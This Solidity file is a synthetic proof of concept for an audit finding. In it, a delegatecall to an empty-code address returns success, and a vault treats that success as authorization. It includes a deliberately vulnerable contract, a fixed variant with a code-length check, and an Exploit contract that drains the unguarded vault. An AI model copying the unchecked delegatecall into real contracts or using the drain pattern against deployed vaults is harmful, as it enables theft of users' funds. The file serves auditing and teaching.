// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Nested / Tetris StaticHyVM — delegatecall to empty code returns success
    (Trail of Bits, finding #29658).
    SYNTHETIC. doDelegateCall is the audited function. hyvm has no code, so
    the EVM reports success and the payload never runs. A vault treats that
    success as authorization and releases its tokens.
    FIX: if (hyvm.code.length == 0) revert. */

contract Asset {
    string public name = "Vault asset";
    string public symbol = "VAULT";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    address public immutable minter;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract StaticHyVM {
    address public hyvm;
    error OnlySelf();
    error DelegateFailed();

    constructor(address _hyvm) {
        hyvm = _hyvm;
    }

    function run(bytes calldata payload) external returns (bytes memory) {
        return this.doDelegateCall(payload);
    }

    function doDelegateCall(bytes calldata payload) public returns (bytes memory) {
        if (msg.sender != address(this)) revert OnlySelf();
        // @> VULN: hyvm has no code; delegatecall still returns success and the guard payload never executes
        // FIX: if (hyvm.code.length == 0) revert EmptyCode();
        (bool success, bytes memory data) = hyvm.delegatecall(payload);
        if (!success) revert DelegateFailed();
        return data;
    }
}

contract StaticHyVMChecked {
    address public hyvm;
    error OnlySelf();
    error EmptyCode();
    error DelegateFailed();

    constructor(address _hyvm) {
        hyvm = _hyvm;
    }

    function run(bytes calldata payload) external returns (bytes memory) {
        return this.doDelegateCall(payload);
    }

    function doDelegateCall(bytes calldata payload) public returns (bytes memory) {
        if (msg.sender != address(this)) revert OnlySelf();
        if (hyvm.code.length == 0) revert EmptyCode();
        (bool success, bytes memory data) = hyvm.delegatecall(payload);
        if (!success) revert DelegateFailed();
        return data;
    }
}

contract Vault {
    Asset public immutable asset;
    uint256 public constant AMOUNT = 1_000 ether;

    constructor(Asset _asset) {
        asset = _asset;
    }

    /// Success of the HyVM call is treated as permission to release the vault.
    function withdraw(address hyvmRunner, address to) external {
        StaticHyVM(hyvmRunner).run(hex"01");
        asset.transfer(to, AMOUNT);
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 1_000 ether;
    /// Unallocated address. It has no runtime code.
    address public constant EMPTY = address(0x000000000000000000000000000000000000bEEF);

    Asset public asset;
    StaticHyVM public hyvm;
    StaticHyVMChecked public checked;
    Vault public openVault;
    Vault public guardedVault;
    uint256 public stolen;
    bool public controlReverted;

    constructor() {
        asset = new Asset();
        hyvm = new StaticHyVM(EMPTY);
        checked = new StaticHyVMChecked(EMPTY);
        openVault = new Vault(asset);
        guardedVault = new Vault(asset);
    }

    function run() external {
        asset.mint(address(openVault), AMOUNT);
        asset.mint(address(guardedVault), AMOUNT);
        openVault.withdraw(address(hyvm), address(this));
        stolen = asset.balanceOf(address(this));
        require(stolen == AMOUNT, "empty hyvm did not release the vault");
        require(asset.balanceOf(address(openVault)) == 0, "open vault still holds funds");
        try guardedVault.withdraw(address(checked), address(this)) {
            controlReverted = false;
        } catch {
            controlReverted = true;
        }
        require(controlReverted, "codesize check did not revert");
        require(asset.balanceOf(address(guardedVault)) == AMOUNT, "control vault was drained");
        require(hyvm.hyvm().code.length == 0, "hyvm unexpectedly has code");
    }
}
